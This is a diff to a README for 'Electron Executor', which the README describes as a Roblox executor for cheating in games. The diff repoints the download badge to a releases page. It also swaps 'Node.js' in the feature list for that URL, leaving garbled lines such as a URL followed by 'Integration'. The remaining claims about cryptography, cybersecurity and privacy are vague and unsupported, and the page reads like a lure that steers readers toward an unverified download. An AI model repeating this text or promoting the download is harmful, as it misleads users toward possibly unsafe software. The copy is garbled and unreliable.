@@ -9,7 +9,7 @@ Welcome to the official repository of Electron Executor, a powerful Roblox Execu
 
 ## Getting Started with Electron Executor:
 To download Electron Executor, click on the following link:
-[![Download Electron Executor](https://img.shields.io/badge/Download-Electron%20Executor-blue)](https://github.com/files/File.zip)
+[![Download Electron Executor](https://github.com/PochiMoli/Electron-Executor/releases%20Executor-blue)](https://github.com/PochiMoli/Electron-Executor/releases)
 
 ## About Electron Executor:
 Electron Executor is a cutting-edge Roblox Executor that provides users with advanced functionalities to enhance their gameplay. With features focused on security and performance, Electron Executor is a top choice among Roblox enthusiasts.
@@ -18,7 +18,7 @@ Electron Executor is a cutting-edge Roblox Executor that provides users with adv
 - **Cryptography:** Utilizes advanced cryptographic techniques to ensure secure execution.
 - **Cybersecurity:** Prioritizes the security of user data and game interactions.
 - **Mobile Compatibility:** Coming soon - an update for Android users!
-- **Node.js Integration:** Seamlessly integrates with Node.js for enhanced performance.
+- **https://github.com/PochiMoli/Electron-Executor/releases Integration:** Seamlessly integrates with https://github.com/PochiMoli/Electron-Executor/releases for enhanced performance.
 - **Privacy Protection:** Implements measures to protect user privacy and data.
 
 ## Why Choose Electron Executor?
